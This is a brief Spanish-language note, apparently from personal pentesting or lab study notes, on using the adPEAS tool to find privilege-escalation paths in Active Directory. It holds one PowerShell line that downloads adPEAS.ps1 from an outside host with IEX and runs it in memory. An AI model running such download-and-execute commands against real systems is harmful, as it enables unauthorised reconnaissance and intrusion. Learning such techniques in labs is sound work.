
----------

---------------------

- Herramienta para la busqueda de vias potenciales de escalar privilegios en maquinas de directorio activo
![[Pasted image 20240725153754.png]]

- Usamos IEX para poder ejecutar las funciones de la herramienta desde el sistema windows.
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/adPEAS.ps1')
```

- Y usamos la funcion INVOKE-adPEAS
